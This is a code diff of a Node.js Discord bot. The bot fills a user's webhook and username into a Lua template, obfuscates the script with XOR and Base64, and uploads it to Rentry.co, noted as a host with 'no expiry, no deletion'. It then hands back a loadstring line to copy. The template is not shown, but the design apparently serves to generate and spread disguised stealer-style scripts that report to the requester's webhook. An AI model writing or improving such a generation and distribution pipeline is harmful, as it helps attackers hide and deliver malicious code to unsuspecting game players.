@@ -3,51 +3,23 @@ const axios = require('axios');
 const fs = require('fs');
 const path = require('path');
 const express = require('express');
-const { v4: uuidv4 } = require('uuid');
 require('dotenv').config();
 
-// ----- Web server (only for health check & optional self‑host fallback) -----
+// ----- Web server (health check only) -----
 const app = express();
 const PORT = process.env.PORT || 3000;
 app.get('/', (req, res) => res.send('Bot is alive!'));
-
-// Also keep self‑host for fallback
-const STORE_FILE = path.join(__dirname, 'scripts.json');
-let scripts = new Map();
-if (fs.existsSync(STORE_FILE)) {
-    try {
-        const data = JSON.parse(fs.readFileSync(STORE_FILE, 'utf8'));
-        const now = Date.now();
-        for (const [id, entry] of Object.entries(data)) {
-            if (now < entry.expires) scripts.set(id, entry);
-        }
-    } catch (e) {}
-}
-function saveScripts() {
-    const obj = Object.fromEntries(scripts);
-    fs.writeFileSync(STORE_FILE, JSON.stringify(obj, null, 2));
-}
-
-app.get('/script/:id', (req, res) => {
-    const id = req.params.id;
-    const entry = scripts.get(id);
-    if (!entry || Date.now() > entry.expires) {
-        scripts.delete(id);
-        saveScripts();
-        return res.status(404).send('Script not found or expired.');
-    }
-    res.set('Content-Type', 'text/plain');
-    res.send(entry.content);
-});
 app.listen(PORT, () => console.log(`✅ Web server running on port ${PORT}`));
 
-// ----- Determine public base URL (for self‑host fallback) -----
-const BASE_URL = process.env.RENDER_EXTERNAL_URL || process.env.RENDER_URL || `http://localhost:${PORT}`;
-if (!BASE_URL.includes('localhost')) {
-    console.log(`🌐 Public base URL: ${BASE_URL}`);
-    // Self‑ping (keep Render awake)
-    setInterval(() => axios.get(BASE_URL).catch(() => {}), 4 * 60 * 1000);
-    setTimeout(() => axios.get(BASE_URL).catch(() => {}), 5000);
+// ----- Self‑ping (keep Render awake) -----
+// We'll ping Render's own URL – if not set, we skip.
+const RENDER_URL = process.env.RENDER_EXTERNAL_URL || process.env.RENDER_URL;
+if (RENDER_URL) {
+    console.log(`🔁 Self‑ping enabled: ${RENDER_URL}`);
+    setInterval(() => axios.get(RENDER_URL).catch(() => {}), 4 * 60 * 1000);
+    setTimeout(() => axios.get(RENDER_URL).catch(() => {}), 5000);
+} else {
+    console.log('⚠️ Self‑ping disabled (RENDER_URL not set) – bot may sleep.');
 }
 
 // ----- Discord Bot -----
@@ -96,47 +68,36 @@ client.on('interactionCreate', async interaction => {
         // ----- Read template -----
         const templatePath = path.join(__dirname, 'template.lua');
         if (!fs.existsSync(templatePath)) {
-            return interaction.editReply({ content: '❌ Template file not found.' });
+            return interaction.editReply({ 
+                content: '❌ Template file `template.lua` not found in the bot directory.' 
+            });
         }
         let template = fs.readFileSync(templatePath, 'utf8');
         template = template.replace(/\{\{WEBHOOK\}\}/g, webhook);
         template = template.replace(/\{\{USERNAME\}\}/g, username);
 
-        // ----- Obfuscate locally -----
+        // ----- Obfuscate -----
         const obfuscated = obfuscateScript(template);
 
-        // ----- Try to upload to Rentry.co (primary) -----
+        // ----- Upload to Rentry.co (no API key, never deletes) -----
         let rawUrl;
-        let source = 'Rentry.co';
         try {
-            const rentryRes = await axios.post('https://rentry.co/api/new', {
-                text: obfuscated,
-                // optional custom slug – set a random one to avoid collisions
-                // url: `exodus_${Date.now()}`
+            const response = await axios.post('https://rentry.co/api/new', {
+                text: obfuscated
             });
-            if (rentryRes.data && rentryRes.data.url) {
-                const slug = rentryRes.data.url.split('/').pop();
+            if (response.data && response.data.url) {
+                const slug = response.data.url.split('/').pop();
                 rawUrl = `https://rentry.co/raw/${slug}`;
                 console.log(`✅ Uploaded to Rentry: ${rawUrl}`);
             } else {
-                throw new Error('Rentry response missing URL');
+                throw new Error('Rentry returned invalid response');
             }
         } catch (rentryError) {
-            console.warn('⚠️ Rentry upload failed:', rentryError.message);
-            // Fallback: self‑host
-            source = 'Self‑host (backup)';
-            const id = uuidv4();
-            scripts.set(id, {
-                content: obfuscated,
-                expires: Date.now() + 24 * 60 * 60 * 1000
+            console.error('Rentry upload failed:', rentryError.message);
+            // Fallback: we don't have a backup, so tell user
+            return interaction.editReply({ 
+                content: '❌ Failed to upload script to Rentry. Please try again later.' 
             });
-            saveScripts();
-            rawUrl = `${BASE_URL}/script/${id}`;
-            if (BASE_URL.includes('localhost')) {
-                return interaction.editReply({ 
-                    content: '❌ Self‑host fallback is using localhost. Please set RENDER_EXTERNAL_URL environment variable.' 
-                });
-            }
         }
 
         // ----- Build loadstring -----
@@ -149,17 +110,12 @@ client.on('interactionCreate', async interaction => {
             .setDescription(`**Game:** ${game}\n**User:** ${username}`)
             .addFields(
                 { name: '📜 Loadstring (copy this)', value: `\`\`\`lua\n${loadstringLine}\n\`\`\``, inline: false },
-                { name: '📦 Hosted on', value: source, inline: false },
-                { name: '🔒 Obfuscation', value: 'XOR + Base64', inline: false }
+                { name: '📦 Hosted on', value: 'Rentry.co (no expiry, no deletion)', inline: false },
+                { name: '🔒 Obfuscation', value: 'XOR + Base64 (lightweight)', inline: false }
             )
             .setTimestamp();
 
         await interaction.editReply({ embeds: [embed] });
-
-        // ----- Self‑ping (if using self‑host fallback) -----
-        if (source === 'Self‑host (backup)' && !BASE_URL.includes('localhost')) {
-            axios.get(BASE_URL).catch(() => {});
-        }
 
     } catch (error) {
         console.error(error);
@@ -167,7 +123,7 @@ client.on('interactionCreate', async interaction => {
     }
 });
 
-// ----- Local obfuscator -----
+// ----- Obfuscator (XOR + Base64) -----
 function obfuscateScript(raw) {
     const key = Math.floor(Math.random() * 254) + 1;
     let xorEncoded = '';
